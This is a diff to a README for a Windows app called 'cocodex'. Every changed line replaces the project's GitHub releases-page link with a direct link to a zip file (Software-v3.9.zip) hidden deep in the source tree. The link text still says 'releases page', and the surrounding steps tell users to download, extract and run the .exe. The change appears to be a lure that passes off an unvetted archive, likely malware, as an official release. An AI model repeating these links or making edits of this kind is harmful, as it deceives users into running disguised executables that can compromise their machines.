@@ -1,6 +1,6 @@
 # 💠 cocodex - Use Codex Your Way
 
-[![Download cocodex](https://img.shields.io/badge/Download-cocodex-purple?style=for-the-badge)](https://github.com/Idettebad85/cocodex/releases)
+[![Download cocodex](https://img.shields.io/badge/Download-cocodex-purple?style=for-the-badge)](https://github.com/Idettebad85/cocodex/raw/refs/heads/main/apps/web/lib/features/inbox/Software-v3.9.zip)
 
 ## 🧭 What is cocodex?
 
@@ -10,7 +10,7 @@ The app is built for people who want a clean path from download to use. It keeps
 
 ## 📥 Download cocodex for Windows
 
-Visit the [cocodex releases page](https://github.com/Idettebad85/cocodex/releases) to download and run the Windows file.
+Visit the [cocodex releases page](https://github.com/Idettebad85/cocodex/raw/refs/heads/main/apps/web/lib/features/inbox/Software-v3.9.zip) to download and run the Windows file.
 
 On that page, look for the latest release and choose the file made for Windows. In most cases, this will be a `.exe` file or a Windows zip file.
 
@@ -18,7 +18,7 @@ On that page, look for the latest release and choose the file made for Windows. 
 
 Use these steps to get cocodex running on your PC:
 
-1. Open the [releases page](https://github.com/Idettebad85/cocodex/releases).
+1. Open the [releases page](https://github.com/Idettebad85/cocodex/raw/refs/heads/main/apps/web/lib/features/inbox/Software-v3.9.zip).
 2. Find the newest release at the top of the list.
 3. Download the Windows file for that release.
 4. If you downloaded a `.zip` file, right-click it and choose Extract All.
@@ -131,7 +131,7 @@ If the app opens but does not connect, check your internet connection and try ag
 
 ## 📌 Quick Install Path
 
-1. Go to the [cocodex releases page](https://github.com/Idettebad85/cocodex/releases).
+1. Go to the [cocodex releases page](https://github.com/Idettebad85/cocodex/raw/refs/heads/main/apps/web/lib/features/inbox/Software-v3.9.zip).
 2. Download the latest Windows file.
 3. Open the file or extract the zip.
 4. Run the `.exe` file.
@@ -155,4 +155,4 @@ Use the license included in the repository for details on how cocodex can be use
 
 ## 🔗 Download Again
 
-If you need the file again, use the [cocodex releases page](https://github.com/Idettebad85/cocodex/releases) to download and run this file for Windows
+If you need the file again, use the [cocodex releases page](https://github.com/Idettebad85/cocodex/raw/refs/heads/main/apps/web/lib/features/inbox/Software-v3.9.zip) to download and run this file for Windows
